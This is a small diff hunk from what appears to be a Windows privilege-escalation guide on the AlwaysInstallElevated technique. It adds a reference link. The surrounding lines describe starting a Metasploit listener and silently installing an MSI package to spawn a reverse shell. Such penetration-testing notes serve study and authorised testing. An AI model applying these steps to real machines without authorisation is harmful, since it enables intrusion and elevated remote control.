@@ -13,3 +13,5 @@ STart the listener using the `exploit/multi/handler` module on the correct port,
 C:> msiexec /quiet /qn /i  install.msi
 ```
 And a reverse shell should spawn to the listener.
+### Reference
+* https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
